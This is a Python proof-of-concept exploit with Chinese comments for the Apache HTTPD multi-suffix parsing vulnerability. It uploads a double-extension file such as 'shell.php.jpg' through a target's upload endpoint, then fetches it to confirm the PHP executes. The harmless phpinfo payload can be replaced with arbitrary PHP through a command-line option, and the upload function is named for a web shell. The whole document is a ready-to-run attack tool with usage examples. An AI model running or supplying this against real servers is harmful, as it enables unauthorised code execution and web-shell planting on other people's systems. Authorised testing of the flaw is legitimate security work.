#!/usr/bin/env python3
"""
Apache HTTPD 多后缀解析漏洞 POC
原理：Apache 在处理多后缀文件时，只要其中某一个后缀被配置为由 PHP 处理，
      整个文件就会被当作 PHP 执行，从而绕过只检查最后一个后缀的上传限制。
用法：
    python apache_multisuffix_poc.py --target http://target:8080 --upload-url /upload.php --file-field file --upload-dir uploads
"""

import requests
import argparse
import sys
from urllib.parse import urljoin


def upload_webshell(target, upload_url, file_field, filename, content, cookies=None, timeout=10):
    """
    上传恶意文件
    """
    url = urljoin(target, upload_url)
    print(f"[*] 上传目标: {url}")
    print(f"[*] 文件名: {filename}")

    files = {
        file_field: (filename, content, "application/octet-stream")
    }
    headers = {}
    if cookies:
        headers["Cookie"] = cookies

    try:
        resp = requests.post(url, files=files, headers=headers, timeout=timeout)
    except requests.RequestException as e:
        print(f"[-] 上传请求失败: {e}")
        sys.exit(1)

    print(f"[*] 上传响应状态码: {resp.status_code}")
    # 打印部分响应以便调试
    print("[*] 服务器响应（前 500 字符）:")
    print(resp.text[:500])
    return resp


def verify_php_execution(url, content_pattern=None, timeout=10):
    """
    访问上传的文件，检测是否被解析为 PHP
    """
    print(f"[*] 访问恶意文件: {url}")
    try:
        resp = requests.get(url, timeout=timeout)
    except requests.RequestException as e:
        print(f"[-] 访问文件失败: {e}")
        return False, ""

    print(f"[*] 响应状态码: {resp.status_code}")
    # 如果文件中包含 <?php phpinfo(); ?> 则通常能检测到 PHP Version
    if "PHP Version" in resp.text or "phpinfo" in resp.text.lower():
        print("[+] 漏洞存在！文件被解析为 PHP 并执行。")
        return True, resp.text
    elif content_pattern and content_pattern in resp.text:
        print(f"[+] 漏洞存在！找到自定义内容模式: {content_pattern}")
        return True, resp.text
    else:
        print("[-] 文件未被解析为 PHP（或未找到预期输出）。")
        return False, resp.text


def main():
    parser = argparse.ArgumentParser(
        description="Apache HTTPD 多后缀解析漏洞 POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  %(prog)s --target http://192.168.1.10:8080 --upload-url /upload.php --file-field file --upload-dir uploads
  %(prog)s --target http://192.168.1.10:8080 --upload-url /upload.php -c "PHPSESSID=test" --filename info.php.jpg
        """
    )
    parser.add_argument("--target", "-t", required=True, help="目标网站根 URL，例如 http://example.com:8080")
    parser.add_argument("--upload-url", required=True, help="文件上传接口路径，如 /upload.php")
    parser.add_argument("--file-field", default="file", help="上传表单中文件字段的名称 (默认: file)")
    parser.add_argument("--upload-dir", default="uploads", help="上传文件存储目录 (默认: uploads)")
    parser.add_argument("--filename", default="shell.php.jpg", help="恶意文件名，需包含可执行后缀 (默认: shell.php.jpg)")
    parser.add_argument("--content", default="<?php phpinfo(); ?>", help="上传的 PHP 代码 (默认: <?php phpinfo(); ?>)")
    parser.add_argument("--cookies", "-c", help="认证 Cookie，格式如 'PHPSESSID=xxx'")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时 (默认: 10 秒)")
    args = parser.parse_args()

    target = args.target.rstrip("/")

    # 上传恶意文件
    resp = upload_webshell(
        target=target,
        upload_url=args.upload_url,
        file_field=args.file_field,
        filename=args.filename,
        content=args.content,
        cookies=args.cookies,
        timeout=args.timeout
    )

    # 构造访问 URL：假设服务器没有重命名文件，直接使用原始文件名
    # 注意：文件名中的特殊字符可能需要 URL 编码，不过 .php.jpg 是安全的
    shell_url = urljoin(target, f"{args.upload_dir.rstrip('/')}/{args.filename}")
    success, output = verify_php_execution(shell_url, timeout=args.timeout)

    if success:
        print("[+] 响应内容（前 1000 字符）:")
        print(output[:1000])
        print("\n[✓] 漏洞利用成功！")
    else:
        print("[-] 漏洞利用失败，请检查上传接口、目录及服务器配置。")


if __name__ == "__main__":
    main()